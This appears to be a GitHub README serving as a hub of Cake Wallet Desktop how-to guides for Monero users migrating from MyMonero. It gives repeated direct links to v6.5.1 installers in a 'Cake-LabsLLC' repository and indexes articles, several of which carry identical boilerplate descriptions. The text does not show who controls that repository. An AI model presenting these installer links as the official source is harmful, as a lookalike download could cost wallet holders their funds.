<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-hub.png" alt="Cake Wallet hub banner" width="100%"></p>

<h1 align="center">Cake Wallet Guides</h1>
<p align="center">How-to articles for Cake Wallet Desktop and for moving from MyMonero</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

Welcome to the Cake Wallet help library. Every article answers one real question from people who use Cake Wallet Desktop for Monero (XMR) or are moving their wallet over from MyMonero. The current desktop release is v6.5.1, available for Windows, macOS and Linux. Pick the topic that matches what you see on your screen.

## How to use this library

Start with the section that describes your situation. If you are coming from the MyMonero desktop wallet, the Migrate section explains how a MyMonero seed is restored in Cake Wallet, how the 13 word and 25 word seeds differ, what a restore height is and when sweeping funds to a fresh wallet makes more sense than restoring. The Desktop Wallet section covers installing Cake Wallet on each system, checking the file you downloaded, and everyday tasks such as sending, receiving and reading a balance that looks wrong. The Seeds and Keys section helps you back up your recovery words, understand view and spend keys and deal with a forgotten PIN. Troubleshooting walks through sync problems, node settings and an app that will not open. The Safety section collects the warning signs of fake downloads and scams.

Each article starts with a short answer, then lists the symptoms, the cause, a numbered fix and what to try if the fix did not work. Every article ends with the same download block, so you can always reach the official installers and the checksums published on the release page. Before you install any file, compare its SHA-256 with the value on the release page; if a single character differs, delete the file and download it again.

> [!WARNING]
> No guide here will ever ask for your seed, private keys or PIN. Anyone who does is attempting theft.

---

## Migrate

Moving from MyMonero to Cake Wallet: restoring a 13 or 25 word seed, picking a restore height and deciding between restoring and sweeping.

| Guide | What it covers |
|---|---|
| [Move from MyMonero to Cake Wallet](./how-to/cake-wallet-mymonero-migration.md) | A careful path for restoring a MyMonero backup and checking the result. |
| [Restore a 13-Word MyMonero Seed in Cake Wallet](./how-to/cake-wallet-restore-13-word-seed.md) | What to check when your MyMonero backup contains 13 words. |
| [Restore a 25-Word Monero Seed in Cake Wallet](./how-to/cake-wallet-restore-25-word-seed.md) | Restore a standard Monero seed and allow the wallet to scan. |
| [Choose a Restore Height in Cake Wallet](./how-to/cake-wallet-restore-height.md) | Understand how restore height affects scanning, speed, and history. |
| [Sweep Funds with Cake Wallet](./how-to/cake-wallet-sweep-funds.md) | Learn what sweeping does before sending all funds to a new wallet. |
| [Cake Wallet vs MyMonero](./how-to/cake-wallet-vs-mymonero.md) | Compare the current desktop situation and the practical choices for your backup. |
| [Cake Wallet Migration Checklist](./how-to/cake-wallet-migration-checklist.md) | A measured checklist for preparing, restoring, and verifying a wallet. |
| [Cake Wallet as an Alternative to MyMonero](./how-to/cake-wallet-alternative-to-mymonero.md) | How Cake Wallet can restore a MyMonero seed and what to consider first. |

---

## Desktop Wallet

Installing Cake Wallet Desktop on Windows, macOS and Linux, checking the download, and sending, receiving and reading your balance.

| Guide | What it covers |
|---|---|
| [Install Cake Wallet on Windows](./how-to/install-cake-wallet-windows.md) | Download and verify the Windows desktop release before opening it. |
| [Install Cake Wallet on macOS](./how-to/install-cake-wallet-macos.md) | Download, verify, and open the macOS desktop release safely. |
| [Install Cake Wallet on Linux](./how-to/install-cake-wallet-linux.md) | A careful Linux installation starts with the release archive, a source check, and a safe first launch. |
| [Verify a Cake Wallet Download with SHA-256](./how-to/verify-cake-wallet-download-sha256.md) | Compare a downloaded release file with its published SHA-256 value before opening it. |
| [How to Use Cake Wallet Desktop](./how-to/how-to-use-cake-wallet-desktop.md) | Learn the basic flow for opening a wallet, checking its state, and using send and receive functions. |
| [Send XMR with Cake Wallet](./how-to/cake-wallet-send-xmr.md) | Review the recipient and amount carefully, and protect your recovery information throughout a transfer. |
| [Receive XMR with Cake Wallet](./how-to/cake-wallet-receive-xmr.md) | Use a receive address from the intended wallet and confirm that scanning has caught up. |
| [Cake Wallet Subaddresses](./how-to/cake-wallet-subaddresses.md) | Subaddresses help you organize incoming payments without changing the underlying wallet recovery secret. |
| [Cake Wallet Balance Shows Zero](./how-to/cake-wallet-balance-zero.md) | A zero balance can reflect a different wallet, incomplete scanning, or funds that have not appeared yet. |
| [Cake Wallet Transaction Not Showing](./how-to/cake-wallet-transaction-not-showing.md) | Check the wallet, scan progress, and transaction context before taking further action. |
| [Cake Wallet Locked Balance](./how-to/cake-wallet-locked-balance.md) | Some funds may be visible but temporarily unavailable to spend; check wallet state before acting. |
| [Update Cake Wallet Desktop](./how-to/cake-wallet-update-desktop.md) | Use the project’s release source, confirm the correct operating-system file, and preserve your recovery backup. |

---

## Seeds and Keys

Your recovery words, private keys and PIN, and what to do when one of them causes trouble.

| Guide | What it covers |
|---|---|
| [Back up your Cake Wallet seed | Cake Wallet](./how-to/cake-wallet-backup-seed.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Troubleshoot a Cake Wallet seed that is not accepted | Cake Wallet](./how-to/cake-wallet-seed-not-accepted.md) | Practical, private steps for resolving this Cake Wallet question. |
| [View spend and view keys in Cake Wallet | Cake Wallet](./how-to/cake-wallet-view-spend-keys.md) | Practical, private steps for resolving this Cake Wallet question. |
| [What to do if you forgot your Cake Wallet PIN | Cake Wallet](./how-to/cake-wallet-forgot-pin.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Manage multiple wallets in Cake Wallet | Cake Wallet](./how-to/cake-wallet-multiple-wallets.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Understand newer and legacy seed formats in Cake Wallet | Cake Wallet](./how-to/cake-wallet-polyseed-vs-legacy-seed.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Restore Cake Wallet from keys | Cake Wallet](./how-to/cake-wallet-restore-from-keys.md) | Practical, private steps for resolving this Cake Wallet question. |

---

## Troubleshooting

Sync problems, node settings and an app that will not start.

| Guide | What it covers |
|---|---|
| [Troubleshoot Cake Wallet not syncing | Cake Wallet](./how-to/cake-wallet-not-syncing.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Review node settings in Cake Wallet | Cake Wallet](./how-to/cake-wallet-node-settings.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Troubleshoot Cake Wallet desktop not opening | Cake Wallet](./how-to/cake-wallet-app-not-opening.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Cake Wallet on macOS Cannot Be Opened](./how-to/cake-wallet-macos-cannot-be-opened.md) | Resolve a macOS warning carefully by checking the download source, then opening the app deliberately. |
| [Cake Wallet Windows SmartScreen Warning](./how-to/cake-wallet-windows-smartscreen.md) | Understand a Windows warning without turning off protection or overlooking a suspicious download. |
| [Cake Wallet Linux Won’t Start](./how-to/cake-wallet-linux-wont-start.md) | Check the archive, extraction, and launch context while keeping your system security protections enabled. |
| [Cake Wallet Sync Is Slow](./how-to/cake-wallet-sync-slow.md) | A slow scan can be normal, especially when restoring a wallet from an earlier point in the Monero blockchain. |

---

## Safety

How to stay safe: fake downloads, scams, privacy habits and common questions.

| Guide | What it covers |
|---|---|
| [Is Cake Wallet Safe?](./how-to/is-cake-wallet-safe.md) | Safety depends on obtaining the genuine app, protecting recovery information, and checking actions before you approve them. |
| [Fake Cake Wallet Download Warning](./how-to/cake-wallet-fake-download-warning.md) | Recognize suspicious download claims and verify the exact file before opening it. |
| [Cake Wallet Scams: Warning Signs](./how-to/cake-wallet-scams.md) | Protect your wallet by treating seed requests, unsolicited support, and pressure to send funds as red flags. |
| [Cake Wallet Privacy Tips](./how-to/cake-wallet-privacy-tips.md) | Use careful device, download, and transaction habits to reduce avoidable exposure of wallet information. |
| [Is Cake Wallet Open Source?](./how-to/cake-wallet-open-source.md) | The desktop project has a public GitHub repository; a public code repository is useful context, not a guarantee of safety. |
| [Cake Wallet Desktop FAQ](./how-to/cake-wallet-faq.md) | Answers to common questions about downloading, restoring, syncing, and protecting Cake Wallet Desktop. |

---

## About this library

The articles live in the `how-to` folder and are written as general guidance for Cake Wallet Desktop. The app itself is in [cake-wallet-desktop](https://github.com/Cake-LabsLLC/cake-wallet-desktop), and the downloads and checksums are on the [v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## License

Text in this repository is licensed under CC-BY-4.0. See LICENSE.
